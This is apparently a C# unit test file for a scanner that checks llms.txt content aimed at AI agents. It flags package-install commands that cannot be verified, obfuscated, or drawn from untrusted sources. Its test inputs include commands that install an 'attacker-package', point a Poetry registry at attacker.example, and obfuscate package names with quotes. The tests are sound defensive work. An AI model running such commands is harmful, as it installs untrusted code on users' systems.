using System.Net;
using PowerForge.Web;

namespace PowerForge.Tests;

public sealed partial class WebAgentContentSecurityScannerTests
{
    [Theory]
    [InlineData("poetry add attacker-package")]
    [InlineData("poetry install")]
    [InlineData("poetry sync")]
    [InlineData("poetry update")]
    [InlineData("poetry remove safe-package")]
    [InlineData("poetry lock")]
    [InlineData("poetry run python app.py")]
    [InlineData("poetry build")]
    [InlineData("poetry self add plugin-package")]
    [InlineData("poetry plugin add plugin-package")]
    [InlineData("poetry python install 3.13")]
    public void Scan_RejectsPoetryDependencyAndExecutionFlows(string command)
    {
        using var handler = new RegistryHandler(_ => throw new InvalidOperationException("Registry must not be called."));
        using var scanner = new WebAgentContentSecurityScanner(new HttpClient(handler));
        var root = CreateArtifact("llms.txt", command);
        try
        {
            var result = scanner.Scan(new WebAgentContentSecurityOptions { SiteRoot = root, Files = ["llms.txt"] });

            Assert.False(result.Success);
            Assert.Contains(result.Findings, finding => finding.Code == "PFAGENT.PACKAGE.UNVERIFIABLE_OPERAND");
            Assert.Equal(0, result.PackageReferenceCount);
            Assert.Equal(0, handler.RequestCount);
        }
        finally
        {
            TryDeleteDirectory(root);
        }
    }

    [Theory]
    [InlineData("poetry source add attacker https://attacker.example/simple")]
    [InlineData("poetry config repositories.attacker https://attacker.example/simple")]
    public void Scan_RejectsPoetrySourceConfiguration(string command)
    {
        using var handler = new RegistryHandler(_ => throw new InvalidOperationException("Registry must not be called."));
        using var scanner = new WebAgentContentSecurityScanner(new HttpClient(handler));
        var root = CreateArtifact("llms.txt", command);
        try
        {
            var result = scanner.Scan(new WebAgentContentSecurityOptions { SiteRoot = root, Files = ["llms.txt"] });

            Assert.False(result.Success);
            Assert.Contains(result.Findings, finding => finding.Code == "PFAGENT.PACKAGE.UNTRUSTED_SOURCE");
            Assert.Equal(0, handler.RequestCount);
        }
        finally
        {
            TryDeleteDirectory(root);
        }
    }

    [Theory]
    [InlineData("npm install 'safe'package")]
    [InlineData("npm install safe'package'")]
    [InlineData("pip install \"safe\"package")]
    [InlineData("dotnet add package 'Safe'.Package")]
    public void Scan_RejectsQuoteConcatenatedPackageOperands(string command)
    {
        using var handler = new RegistryHandler(_ => throw new InvalidOperationException("Registry must not be called."));
        using var scanner = new WebAgentContentSecurityScanner(new HttpClient(handler));
        var root = CreateArtifact("llms.txt", command);
        try
        {
            var result = scanner.Scan(new WebAgentContentSecurityOptions { SiteRoot = root, Files = ["llms.txt"] });

            Assert.False(result.Success);
            Assert.Contains(result.Findings, finding => finding.Code == "PFAGENT.PACKAGE.OBFUSCATED_COMMAND");
            Assert.Equal(0, result.PackageReferenceCount);
            Assert.Equal(0, handler.RequestCount);
        }
        finally
        {
            TryDeleteDirectory(root);
        }
    }

    [Fact]
    public void Scan_IgnoresQuoteConcatenationInsideShellComment()
    {
        using var handler = new RegistryHandler(_ => JsonResponse("""{"versions":{"1.0.0":{}}}"""));
        using var scanner = new WebAgentContentSecurityScanner(new HttpClient(handler));
        var root = CreateArtifact("llms.txt", "npm install safe-package@1.0.0 # example 'not'a package operand");
        try
        {
            var result = scanner.Scan(new WebAgentContentSecurityOptions { SiteRoot = root, Files = ["llms.txt"] });

            Assert.True(result.Success, string.Join(" | ", result.Findings.Select(static finding => finding.Message)));
            Assert.Equal(1, result.VerifiedPackageCount);
        }
        finally
        {
            TryDeleteDirectory(root);
        }
    }

    [Theory]
    [InlineData("./npm install safe-package@1.0.0")]
    [InlineData("/tmp/npm install safe-package@1.0.0")]
    [InlineData(@".\npm.cmd install safe-package@1.0.0")]
    [InlineData(@"C:\tools\npm.cmd install safe-package@1.0.0")]
    [InlineData(@".\dotnet.exe add package Safe.Package --version 1.0.0")]
    [InlineData("node /usr/lib/node_modules/npm/bin/npm-cli.js install safe-package@1.0.0")]
    [InlineData("node /usr/lib/node_modules/npm/bin/npx-cli.js safe-package@1.0.0")]
    [InlineData("node /opt/pnpm/pnpm.cjs install safe-package@1.0.0")]
    [InlineData("node /opt/yarn/yarn.js add safe-package@1.0.0")]
    [InlineData("php /usr/local/bin/composer.phar require safe/package:1.0.0")]
    public void Scan_RejectsPathQualifiedPackageExecutables(string command)
    {
        using var handler = new RegistryHandler(_ => throw new InvalidOperationException("Registry must not be called."));
        using var scanner = new WebAgentContentSecurityScanner(new HttpClient(handler));
        var root = CreateArtifact("llms.txt", command);
        try
        {
            var result = scanner.Scan(new WebAgentContentSecurityOptions { SiteRoot = root, Files = ["llms.txt"] });

            Assert.False(result.Success);
            Assert.Contains(result.Findings, finding => finding.Code == "PFAGENT.PACKAGE.OBFUSCATED_COMMAND");
            Assert.Equal(0, result.PackageReferenceCount);
            Assert.Equal(0, handler.RequestCount);
        }
        finally
        {
            TryDeleteDirectory(root);
        }
    }

    [Fact]
    public void Scan_FollowsBoundedPowerShellGalleryVersionPagination()
    {
        var page = 0;
        using var handler = new RegistryHandler(_ =>
        {
            page++;
            return page == 1
                ? XmlResponse("""
                    <?xml version="1.0"?>
                    <feed xmlns="http://www.w3.org/2005/Atom"
                          xmlns:d="http://schemas.microsoft.com/ado/2007/08/dataservices">
                      <entry><content><d:Version>1.0.0</d:Version></content></entry>
                      <link rel="next" href="https://www.powershellgallery.com/api/v2/next-page" />
                    </feed>
                    """)
                : XmlResponse("""
                    <?xml version="1.0"?>
                    <feed xmlns="http://www.w3.org/2005/Atom"
                          xmlns:d="http://schemas.microsoft.com/ado/2007/08/dataservices">
                      <entry><content><d:Version>2.0.0</d:Version></content></entry>
                    </feed>
                    """);
        });
        using var scanner = new WebAgentContentSecurityScanner(new HttpClient(handler));
        var root = CreateArtifact("llms.txt", "Install-Module -Name SafeModule -RequiredVersion 2.0.0");
        try
        {
            var result = scanner.Scan(new WebAgentContentSecurityOptions { SiteRoot = root, Files = ["llms.txt"] });

            Assert.True(result.Success, string.Join(" | ", result.Findings.Select(static finding => finding.Message)));
            Assert.Equal(1, result.PackageReferenceCount);
            Assert.Equal(1, result.VerifiedPackageCount);
            Assert.Equal(2, handler.RequestCount);
        }
        finally
        {
            TryDeleteDirectory(root);
        }
    }
}
